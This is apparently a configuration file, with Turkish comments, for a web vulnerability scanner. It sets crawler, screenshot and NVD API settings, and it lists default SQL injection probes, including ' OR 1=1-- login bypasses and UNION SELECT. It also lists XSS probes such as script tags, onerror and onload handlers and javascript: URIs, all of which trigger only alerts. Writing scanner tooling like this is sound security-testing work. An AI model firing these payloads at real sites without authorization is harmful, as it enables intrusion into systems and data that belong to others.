import os
import sys

# Uygulama dizinini belirle (PyInstaller ile uyumlu)
if getattr(sys, 'frozen', False):
    BASE_DIR = sys._MEIPASS
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Payload dosyalarının yolları
PAYLOADS_DIR = os.path.join(BASE_DIR, "payloads")
SQL_PAYLOADS_FILE = os.path.join(PAYLOADS_DIR, "sql_payloads.txt")
XSS_PAYLOADS_FILE = os.path.join(PAYLOADS_DIR, "xss_payloads.txt")

# Varsayılan payloadlar (dosya yoksa oluşturmak için)
DEFAULT_SQL_PAYLOADS = [
    "''",
    "' OR '1'='1--",
    "' OR 1=1--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' OR 'x'='x",
    "\" OR 1=1--",
    "admin'--",
    "admin' #",
    "admin'/*",
    "admin') or ('1'='1"
]

DEFAULT_XSS_PAYLOADS = [
    "<script>alert('XSS-Vuln')</script>",
    "\"><script>alert('XSS-Vuln')</script>",
    "'';!--\"<XSS>=&{()}",
    "<img src=x onerror=alert('XSS-Vuln')>",
    "<svg/onload=alert('XSS-Vuln')>",
    "<body onload=alert('XSS-Vuln')>",
    "<iframe src=\"javascript:alert('XSS-Vuln')\"></iframe>",
    "<div onmouseover=\"alert('XSS-Vuln')\">HOVER ME</div>",
    "<a href=\"javascript:alert('XSS-Vuln')\">Click Me</a>",
    "<details open ontoggle=\"alert('XSS-Vuln')\">",
    "<input onfocus=\"alert('XSS-Vuln')\" autofocus>"
]

# WebDriver ve Ekran Görüntüsü Yolları (Varsayılan olarak uygulama dizini içinde)
CHROME_DRIVER_PATH = os.path.join(BASE_DIR, "chromedriver") # Linux/macOS için, Windows için chromedriver.exe
SCREENSHOT_DIR = os.path.join(BASE_DIR, "screenshots")

# Crawler Ayarları
MAX_CRAWL_DEPTH = 2
CRAWL_TIMEOUT = 10 # saniye

# NVD API Endpoint
NVD_API_BASE_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"
NVD_API_BASE_URL = "https://services.nvd.nist.gov/rest/json/cves/3.0"
